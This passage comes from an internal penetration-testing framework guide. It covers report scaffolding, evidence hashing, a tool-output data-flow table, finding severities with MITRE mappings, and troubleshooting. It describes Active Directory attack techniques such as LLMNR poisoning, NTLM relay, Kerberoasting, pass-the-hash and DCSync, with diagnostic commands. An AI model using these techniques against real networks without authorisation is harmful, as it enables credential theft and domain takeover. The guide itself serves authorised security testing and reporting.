SMB_VULN_HITS  # grep -ci 'vulnerable' in smb_vuln_checks.txt
ZAP_ALERTS     # parsed from zap_report.json via Python
```

These counts feed directly into the report scaffold's automated finding table.

---

### Step 5.3 — Report Scaffold

The framework writes `report/TECHNICAL_REPORT_SCAFFOLD.md` with:

- Engagement header (name, dates, classification)
- Automated finding table pre-populated with all counts
- Finding template for each finding (Finding 001 through 020)
- Pre-written Finding 002 (LLMNR/NBT-NS) as an example of the expected format
- MITRE ATT&CK coverage matrix skeleton
- Remediation roadmap with timeframes

**What the operator must write manually:**

- Executive summary (2–3 paragraphs, business language, no technical jargon)
- Each finding: title, severity, CVSS score, affected assets, MITRE mapping
- Evidence references (screenshot filenames or command output pastes)
- Business impact statement for each finding
- Numbered remediation steps for each finding
- Complete the MITRE matrix
- Peer review before delivery

---

### Step 5.4 — Evidence Integrity Manifest

```bash
find report/evidence/ -type f | sort | xargs sha256sum > report/evidence_manifest.sha256
```

**Why SHA-256 checksums matter:**

The SHA-256 manifest proves that the evidence files have not been modified after the engagement ended. For each file, the manifest contains the hash at the time of collection. If a client questions a finding months later, the manifest proves that the evidence file's contents match what was collected during the engagement — the hash would differ if the file had been altered.

This is a chain of custody requirement for professional penetration testing, analogous to evidence tagging in physical forensics.

---

### Manual steps — the non-negotiables

Phase 5's automation outputs are inputs for the human writing process. No automation can replace:

1. **Writing findings**: Each finding requires understanding the technical evidence, the business context, and the risk. A finding is not a command output — it is an explanation of what an attacker can do with the vulnerability and what the business risk is.

2. **Writing the executive summary**: Executives do not read technical details. The summary must state the overall risk in one sentence, describe the top two or three findings in business terms, and convey urgency without technical jargon.

3. **Attaching screenshots**: Every critical finding must have a screenshot of the evidence. Command line output copied into a code block is not sufficient for findings that will be reviewed by non-technical stakeholders.

4. **Peer review**: Have a colleague read every finding before delivery. They will catch ambiguities, errors, and impact statements that do not match the technical evidence.

5. **Debrief**: Schedule a debrief session with the management sponsors to walk through the top five findings in person. The written report is the record; the debrief is where decisions are made.

---

## 10. Data Flow Reference Table

All files, their producers, and their consumers, in a single reference:

| File Path | Produced By | Consumed By | Purpose |
|-----------|-------------|-------------|---------|
| `phase0/scope.json` | Phase 0 | Reference only | Engagement metadata |
| `phase1/network/live_hosts_all.txt` | Phase 1 Step 1.1 | Phase 2 SMB vuln checks, Phase 1 fullscan | Windows host list |
| `phase1/network/fullscan.gnmap` | Phase 1 Step 1.2 | Operator review | Service version data |
| `phase1/network/fullscan_portsonly.gnmap` | Phase 1 Step 1.2 (Phase A) | Phase B (fallback) | Port confirmation |
| `phase1/ad/smb_sweep.txt` | Phase 1 Step 1.3 | Operator review | Host enumeration |
| `phase1/ad/relay_targets.txt` | Phase 1 Step 1.3 | Reference | CME lines, signing:False |
| `phase1/ad/relay_target_ips.txt` | Phase 1 Step 1.3 | Phase 3 ntlmrelayx -tf | Relay target IPs |
| `phase1/ad/ldap_rootdse.txt` | Phase 1 Step 1.4 | Operator review | DC LDAP banner |
| `phase1/ad/ldap_users.txt` | Phase 1 Step 1.5 | Reference | Full LDAP attributes |
| `phase1/ad/userlist.txt` | Phase 1 Step 1.5 | Phase 2 GetNPUsers, Phase 3 GetNPUsers, Phase 1 spray | Username list |
| `phase1/ad/nullsession_check.txt` | Phase 1 Step 1.6 | Operator review | Null session test results |
| `phase1/ad/bloodhound/*.zip` | Phase 1 Step 1.7 | BloodHound CE GUI (manual import) | AD graph data |
| `phase1/cloud/roadrecon.db` | Phase 1 Step 1.8 | roadrecon gui (manual) | Entra ID data |
| `phase1/cloud/azure_inventory.json` | Phase 1 Step 1.9 | Operator review | Azure resource list |
| `phase1/ad/spray_results.txt` | Phase 1 Step 1.10 | Operator review | Spray hits |
| `phase2/ad/ad_checks/kerberoastable_accounts.txt` | Phase 2 Step 2.3a | Operator review, Phase 3 context | SPN account list |
| `phase2/ad/ad_checks/asrep_accounts.txt` | Phase 2 Step 2.3b | Operator review, Phase 3 context | No-preauth account list |
| `phase2/ad/ad_checks/password_policy.txt` | Phase 2 Step 2.3c | Phase 1 spray safety check | Lockout threshold |
| `phase2/ad/ad_checks/shares.txt` | Phase 2 Step 2.3d | Operator review | Accessible share list |
| `phase2/ad/ad_checks/domain_admins.txt` | Phase 2 Step 2.3d | Operator review | Domain Admin members |
| `phase2/ad/ad_checks/unconstrained_delegation.txt` | Phase 2 Step 2.3e | Phase 5 finding count | Delegation-vulnerable computers |
| `phase2/ad/ad_checks/pwd_never_expires.txt` | Phase 2 Step 2.3f | Phase 5 finding count | Never-expiring accounts |
| `phase2/ad/ad_checks/adcs/adcs_find.txt` | Phase 2 Step 2.3g | Phase 5 finding count, operator review | AD CS ESC findings |
| `phase2/network/smb_vuln_checks.txt` | Phase 2 Step 2.3h | Phase 5 finding count, operator review | EternalBlue/noPac/PetitPotam results |
| `phase2/cloud/scoutsuite/*/report.html` | Phase 2 Step 2.1 | Operator review, Phase 5 copy | Azure security posture |
| `phase2/web/zap/*/zap_report.html` | Phase 2 Step 2.4 | Operator review, Phase 5 copy | DAST web findings |
| `phase3/ad/kerberoast_tickets.txt` | Phase 3 Step 3.2 | Phase 3 Hashcat (mode 13100) | Raw TGS hashes |
| `phase3/ad/asrep_hashes.txt` | Phase 3 Step 3.3 | Phase 3 Hashcat (mode 18200) | Raw AS-REP hashes |
| `phase3/ad/ntlmv2_all.txt` | Phase 3 Step 3.4 | Phase 3 Hashcat (mode 5600) | Merged NTLMv2 hashes |
| `phase3/ad/cracked_tgs.txt` | Phase 3 Step 3.4 | Phase 4 lateral movement, Phase 5 count | Kerberoast cracks |
| `phase3/ad/cracked_asrep.txt` | Phase 3 Step 3.4 | Phase 4 lateral movement, Phase 5 count | AS-REP cracks |
| `phase3/ad/cracked_ntlm.txt` | Phase 3 Step 3.4 | Phase 4 lateral movement, Phase 5 count | NTLMv2 cracks |
| `phase3/ad/relay_loot/` | Phase 3 Step 3.5 | Operator review | SAM dumps from relay |
| `phase3/ad/pth_accessible_hosts.txt` | Phase 3 Step 3.6 | Phase 4 SAM sweep | PtH-confirmed host IPs |
| `phase4/ad/hop{N}_{ip}.txt` | Phase 4 Step 4.1-4.2 | Phase 4 blast log, Phase 5 | Per-hop evidence |
| `phase4/ad/dcsync_poc.txt` | Phase 4 Step 4.3 | Phase 5 copy, operator review | DCSync capability proof |
| `phase4/cloud/azure_blast.txt` | Phase 4 Step 4.4 | Phase 5 copy | Azure access evidence |
| `phase4/blast_radius/blast_radius.md` | Phase 4 Step 4.5 | Phase 4 blast summary | Hop table |
| `phase4/blast_radius/blast_radius_summary.md` | Phase 4 Step 4.5 | Phase 5 copy | Full blast radius record |
| `report/evidence/` | Phase 5 | Report writing, client delivery | Organised evidence |
| `report/TECHNICAL_REPORT_SCAFFOLD.md` | Phase 5 | Manual report writing | Report template |
| `report/evidence_manifest.sha256` | Phase 5 | Chain of custody verification | SHA-256 checksums |

---

## 11. Finding Classification Guide

Each finding type, what it proves, and its typical severity:

### LLMNR/NBT-NS Poisoning (Responder capture)

**What it proves:** The network uses broadcast name resolution that can be intercepted by any machine on the segment. Windows hosts broadcast authentication credentials over the network without verifying the recipient.

**Severity:** CRITICAL (CVSS 8.8) — no credentials required, affects all Windows hosts on segment, direct path to credential theft.

**Evidence:** Presence of `SMB-NTLMv2-*.txt` files with hash content in `/usr/share/responder/logs/`. Document the source IP, the captured username, and whether the hash was cracked.

**MITRE:** T1557.001

---

### SMB Signing Disabled (relay_target_ips.txt has content)

**What it proves:** SMB sessions to these hosts can be relayed — an authentication captured by Responder can be forwarded to these hosts to gain a session without cracking.

**Severity:** HIGH — enables relay attacks which yield sessions without cracking. Critical if combined with Responder capture.

**Evidence:** CME output showing `signing:False` for each host. Count of affected hosts.

**MITRE:** T1557.001

---

### Kerberoastable Accounts (kerberoastable_accounts.txt + cracked_tgs.txt)

**What it proves:** Service accounts with SPNs exist, and at least some have weak passwords susceptible to offline cracking. A cracked service account credential yields direct access to whatever services and systems that account is used on.

**Severity:** CRITICAL if cracked (cleartext credential obtained), HIGH if not cracked (weak password policy implied for service accounts).

**Evidence:** GetUserSPNs output showing SPN names and account names; cracked_tgs.txt showing cleartext passwords (or rate of cracking failure).

**MITRE:** T1558.003

---

### AS-REP Roasting (asrep_hashes.txt + cracked_asrep.txt)

**What it proves:** Accounts exist that do not require Kerberos pre-authentication. Their password hashes can be obtained without authentication. If the hash is cracked, the cleartext password is known.

**Severity:** CRITICAL if cracked, HIGH if not cracked. Severity is elevated because no credentials are needed to capture the hash.

**Evidence:** GetNPUsers output showing `$krb5asrep$` hashes; cracked_asrep.txt if cracked.

**MITRE:** T1558.004

---

### Unconstrained Delegation

**What it proves:** Non-DC computers are configured to accept any user's TGT for delegation to any service. An attacker who compromises one of these hosts can steal TGTs of any privileged user who authenticates to a service on it.

**Severity:** CRITICAL if the delegating computer is internet-accessible or can be coerced into receiving privileged connections (e.g., via PetitPotam or printer bug). HIGH otherwise.

**Evidence:** LDAP query output from unconstrained_delegation.txt showing computer sAMAccountNames.

**MITRE:** T1098, T1550.003

---

### Pass-the-Hash Access (pth_accessible_hosts.txt)

**What it proves:** NTLM hashes can be reused without cracking to authenticate to multiple systems. The count of Pwn3d hosts demonstrates the blast radius of a single compromised credential.

**Severity:** CRITICAL if the hash is a domain account with local admin on many hosts. HIGH otherwise.

**Evidence:** CME output showing `(Pwn3d!)` against multiple hosts; pth_accessible_hosts.txt count.

**MITRE:** T1550.002

---

### DCSync Capability (dcsync_poc.txt)

**What it proves:** A non-DC principal has the rights to replicate the Active Directory database, meaning they can pull any account's NTLM hash including KRBTGT. This represents complete domain compromise.

**Severity:** CRITICAL — complete domain compromise.

**Evidence:** impacket-secretsdump output showing `Dumping Domain Credentials` and the hash line for the test account.

**MITRE:** T1003.006

---

### AD CS Misconfiguration (adcs_find.txt, ESC findings)

**What it proves:** Specific ESC classes have different implications. ESC1 proves that any domain user can obtain a certificate authenticating as a privileged account. ESC8 proves NTLM relay to the CA is possible.

**Severity:** CRITICAL for ESC1, ESC6, ESC8. HIGH for ESC2, ESC3, ESC4.

**Evidence:** Certipy output showing template name, ESC class, and affected CA.

**MITRE:** T1649

---

### EternalBlue / MS17-010 (smb_vuln_checks.txt)

**What it proves:** The host is unpatched against a 2017 vulnerability that allows unauthenticated RCE as SYSTEM via SMBv1.

**Severity:** CRITICAL — unauthenticated RCE as SYSTEM. This is the highest severity finding possible.

**Evidence:** CME ms17-010 module output showing `VULNERABLE` against specific hosts.

**MITRE:** T1210

---

### Password Never Expires (pwd_never_expires.txt)

**What it proves:** These accounts are not subject to mandatory password rotation, creating a long-term weak password risk. Accounts that disproportionately appear in cracked credential lists.

**Severity:** MEDIUM (policy violation and indirect risk), escalating to HIGH if these accounts appear in cracked credentials.

**Evidence:** LDAP query output count; cross-reference with cracked credentials to demonstrate causation.

**MITRE:** M1027 (remediation technique)

---

### Null Session (nullsession_check.txt)

**What it proves:** Unauthenticated SMB access to the DC is permitted. This is a legacy configuration from Windows Server 2003 era that allows enumeration without credentials.

**Severity:** MEDIUM — information disclosure without credentials.

**Evidence:** CME output showing successful null session (no STATUS_ACCESS_DENIED).

**MITRE:** T1135, T1087.002

---

### Public Azure Storage (public_blob_poc.txt)

**What it proves:** Azure storage containers are publicly accessible without authentication. Anyone with the URL can read the stored data.

**Severity:** CRITICAL if sensitive data is present, HIGH otherwise.

**Evidence:** az storage blob list showing content without authentication; public_blob_poc.txt CRITICAL lines.

**MITRE:** T1530

---

## 12. What Good Looks Like / What Bad Looks Like

### Phase 0 — Good

- All required tools show as found in a single run with no missing tools
- BloodHound CE starts and the UI loads at http://localhost:8080 within 2 minutes
- `az account show` returns the correct tenant
- `scope.json` contains correct IPs and subnets matching the RoE
- Corporate wordlist generates more than 300 entries

### Phase 0 — Bad

- Multiple tools missing and auto-install fails — this means the attacker machine was not prepared. Fix all tool issues before the testing window opens.
- BloodHound CE fails to start — check `bloodhound-cli logs` for Neo4j database errors or port conflicts
- Azure CLI returns the wrong tenant — you will be enumerating the wrong cloud environment
- `scope.json` shows wrong subnets — you will be scanning out-of-scope ranges

### Phase 1 — Good

- `live_hosts_all.txt` has a host count that approximately matches the expected number of Windows hosts in the asset inventory (within 20%)
- `fullscan.gnmap` is non-empty and contains `Ports:` lines for most hosts
- `userlist.txt` has at least as many entries as the HR-provided user count
- `bloodhound/*.zip` exists and is non-zero size
- `relay_target_ips.txt` exists (even if empty — empty means all hosts have signing, which is a positive finding)

### Phase 1 — Bad

- `live_hosts_all.txt` is empty — nmap found no hosts. Check `TARGET_SUBNETS`, check that the attacker machine can reach the target network, check that `NMAP_DISCOVERY_PORTS` matches the OS type of target hosts
- `fullscan.gnmap` is empty or zero bytes — Phase A found no confirmed-open ports, or Phase B timed out. The empty-file guard in the framework will log this; re-run with `--only nmap_fullscan`
- `userlist.txt` has fewer users than expected — LDAP authentication failed or the base DN is wrong. Check `DOMAIN_NAME` format (must be lowercase FQDN, e.g., `hashem.local` not `HASHEM.LOCAL`)
- BloodHound ZIP is empty — `bloodhound-python` failed to authenticate. Check domain credentials. Check DNS resolution: `bloodhound-python` needs to resolve `hashem.local` to the DC IP

### Phase 2 — Good

- `kerberoastable_accounts.txt` shows at least some SPN accounts (typical: 5–30 in an enterprise environment)
- `password_policy.txt` shows a lockout threshold (confirms the policy was read correctly)
- `adcs_find.txt` contains `ESC` findings if AD CS is deployed — absence may mean no AD CS exists, or Certipy authentication failed
- `smb_vuln_checks.txt` exists and has output (even if no VULNERABLE findings — that is a positive result)

### Phase 2 — Bad

- `ad_checks/done.flag` never created — one of the AD check steps failed. Check the nxc version (the `--groups` flag syntax changed between CME and nxc)
- `kerberoastable_accounts.txt` is empty but you know service accounts with SPNs exist — authentication failed. Check `DOMAIN_USER/DOMAIN_PASS`
- `adcs_find.txt` has `KRB_AP_ERR_SKEW` errors — clock skew between attacker and DC exceeds the 5-minute Kerberos tolerance. Run `ntpdate -u $DC_IP` to sync the clock

### Phase 3 — Good

- Responder logs show `SMB-NTLMv2-*.txt` files appearing within the first hour of operation
- Hashcat progress shows meaningful cracking speed (>1 MH/s on CPU is acceptable; GPU is much faster)
- `kerberoast_tickets.txt` has `krb5tgs$` lines matching the count from Phase 2
- `pth_accessible_hosts.txt` is populated after PtH sweep (or explicitly empty with a log noting why)

### Phase 3 — Bad

- No Responder captures after 4 hours — either LLMNR/NBT-NS is already disabled (good for the client, no Responder finding) or Responder is not on the correct interface. Check `ip addr show` matches `ATTACKER_INTERFACE`
- Hashcat exits immediately with `No hashes loaded` — the input hash file is malformed or empty. Check `kerberoast_tickets.txt` format with `head -1`
- ntlmrelayx fires but produces empty `relay_loot/` — the relay target has admin required for SAM dump and the relayed user is not an administrator on the relay target. Try different targets from `relay_target_ips.txt`

### Phase 4 — Good

- `hop{N}_{ip}.txt` files exist for each PtH host and contain `(Pwn3d!)` confirmation
- SAM dumps in hop files show hash lines (e.g., `Administrator:500:aad3b...:::`)
- `blast_radius.md` hop table has entries for every lateral move performed
- `dcsync_poc.txt` exists and shows the target account's hash if DCSync was confirmed

### Phase 4 — Bad

- `pth_accessible_hosts.txt` is empty — the hash used for PtH sweep is wrong (expired, wrong format) or all hosts have NTLMv2 restrictions. Check that the hash is in NT-hash-only format (not LM:NT format — provide just the 32-character NT hash)
- DCSync fails with `DRSUAPI_DS_BIND_IS_NOT_AUTHENTICATED` — the account used does not actually have DCSync rights. Trust BloodHound's path analysis; if it says the path exists, double-check the path by examining intermediate group memberships

### Phase 5 — Good

- `evidence/` contains files from all categories (network, ad, cloud, web, cracked)
- `evidence_manifest.sha256` exists and has line count matching the number of evidence files
- `TECHNICAL_REPORT_SCAFFOLD.md` has non-zero counts in the automated finding table
- All finding sections in the scaffold are completed before delivery

### Phase 5 — Bad

- `evidence/cracked/` is empty — cracking jobs produced no results. This is a result, not a failure — report it as "Hashcat was unable to crack captured hashes with the configured wordlists"
- `evidence_manifest.sha256` is missing — sha256sum failed (unlikely) or Phase 5 was run before evidence was collected. Evidence integrity cannot be guaranteed; note this in the report delivery process
- Report scaffold has `[COMPLETE MANUALLY]` placeholders in the delivered document — peer review must catch this before delivery

---

## 13. Failure Modes and How to Diagnose Them

### "live_hosts_all.txt is empty"

**Cause 1:** `TARGET_SUBNETS` contains a typo (e.g., `10.10.10.0/24` instead of `10.10.0.0/24`). Verify against the asset inventory.

**Cause 2:** The attacker machine is not on the same network segment as the targets and the route is not configured. Run `ip route show` and `traceroute 10.10.1.10`.

**Cause 3:** A firewall is blocking TCP SYN packets to the Windows ports. Try `nmap -sS -p 445 10.10.1.10` directly — if this fails but ping succeeds, a stateful firewall is blocking inbound SYN packets. Try with `-PS` (TCP SYN ping to alternate ports) or request firewall exception.

**Cause 4:** `NMAP_DISCOVERY_PORTS` was changed to include port 22 or 80, causing false positives that got filtered out. Restore the Windows-signature port set.

---

### "fullscan.gnmap is empty or zero bytes"

**Cause 1:** Phase A found no confirmed-open ports (all hosts are filtered). Check if a firewall is dropping packets. The framework falls back to Phase A output, so `fullscan.gnmap` will still be written but may only show `filtered` states.

**Cause 2:** Phase B timed out before producing output — the host-timeout was too short. Increase `NMAP_HOST_TIMEOUT_FULLSCAN` in config.env. Default is 300s; increase to 600s for slow networks.

**Cause 3:** A prior failed run left a zero-byte `fullscan.gnmap`. The framework detects this and removes it before re-running. If you see this behaviour repeatedly, check disk space: `df -h $OUTPUT_BASE_DIR`.

---

### "BloodHound ZIP is present but import fails in the UI"

**Cause 1:** The ZIP contains JSON files that were partially written (bloodhound-python was killed mid-collection). Delete the existing ZIP, re-run bloodhound collection: `python3 orchestrator.py --phase 1 --only bloodhound`.

**Cause 2:** BloodHound CE version mismatch. The bloodhound-python version must match the BloodHound CE version for the ZIP format to be compatible. Check `bloodhound-cli version` and the version of `bloodhound-python`: `pip3 show bloodhound`.

**Cause 3:** Clock skew — the ZIP timestamp is in the future relative to BloodHound's system time. Sync the attacker machine clock.

---

### "GetUserSPNs returns no accounts despite known SPNs"

**Cause 1:** The domain user account used does not have read access to the `servicePrincipalName` attribute. In highly restricted environments, standard users may not have this right. Test with a more privileged account.

**Cause 2:** The DC IP is wrong. GetUserSPNs connects to the `-dc-ip` specified. Verify with `nxc smb 10.10.1.10 -u USER -p PASS -d hashem.local` — if this succeeds but GetUserSPNs fails, there may be a Kerberos realm mismatch (domain name case sensitivity).

---

### "Hashcat runs but produces no cracked passwords"

**Cause 1 (expected):** The passwords are genuinely strong. Report this as a positive finding if the minimum password length in `password_policy.txt` is 14+ characters and complexity is enforced.

**Cause 2:** The wordlist path is wrong — hashcat exited with `No wordlist given`. Check that `WORDLIST_PRIMARY` points to an existing, non-zero file.

**Cause 3:** Hash format mismatch. Verify the hash mode: use `hashcat --example-hashes | grep -A5 '5600'` to see what a valid NTLMv2 hash should look like and compare to `ntlmv2_all.txt`.

**Cause 4:** Hashcat was interrupted and the potfile contains the hash as "exhausted." Run `hashcat --show -m 5600 ntlmv2_all.txt` to check. If shown as exhausted, the wordlist was fully tried. Try a different wordlist or rules.

---

### "ntlmrelayx fires but no SAM dumps appear in relay_loot/"

**Cause 1:** The relayed user is not a local administrator on the relay target. ntlmrelayx relays the session but cannot execute SAM dump without admin rights. The session is authenticated but limited. Add `--escalate-user` or try targets where the victim is known to be an admin (check BloodHound for local admin edges).

**Cause 2:** SMB signing is enabled on the relay target despite appearing in `relay_target_ips.txt`. The signing check uses grep on CME output — if the output format changed between nxc versions, the grep may not match. Verify manually with `nxc smb 10.10.0.5 -u '' -p ''` and check the output for signing status.

**Cause 3:** Responder is not configured for relay mode (SMB and HTTP not set to Off in `Responder.conf`). Verify the config and restart Responder.

---

### "Certipy fails with Kerberos errors"

**Cause 1:** Clock skew greater than 5 minutes. Run `sudo ntpdate -u $DC_IP` or `sudo timedatectl set-ntp true`.

**Cause 2:** DNS resolution. Certipy uses Kerberos which requires DNS-resolvable hostnames. Ensure `/etc/resolv.conf` has the DC's IP as the nameserver: `echo "nameserver 10.10.1.10" | sudo tee /etc/resolv.conf`.

**Cause 3:** The `-dc-ip` flag resolved to a DC that does not host the Certificate Services role. Try each DC IP individually.

---

### "Phase 5 report scaffold has all-zero counts"

**Cause:** Phase 5 ran before Phase 3 cracking completed or before Phase 2 AD checks finished. The count extraction reads from files that may not yet exist or are empty.

**Fix:** Wait for all background jobs to complete (`python3 orchestrator.py --status`), then re-run Phase 5: `python3 orchestrator.py --phase 5`.

---

### "Spray is blocked by the framework despite SPRAY_MAX_ATTEMPTS=2"

**Cause:** The lockout threshold in `password_policy.txt` is 2 (unusual but possible in high-security environments). `SPRAY_MAX_ATTEMPTS (2) >= lockout_threshold (2)` triggers the block. Reduce `SPRAY_MAX_ATTEMPTS` to 1 or do not spray.

**Rationale:** Attempting 2 sprays against a lockout threshold of 2 means the next failed login from any source — including the user themselves mistyping their password — will lock the account. The safety margin must be at least 1 attempt below the threshold.

---

*End of Training Document*

---

**Document maintained by:** Infrastructure Security Team  
**Review cycle:** After each major engagement; update when framework scripts change  
**Questions:** Raise in the team security channel; do not send credentials or evidence via email
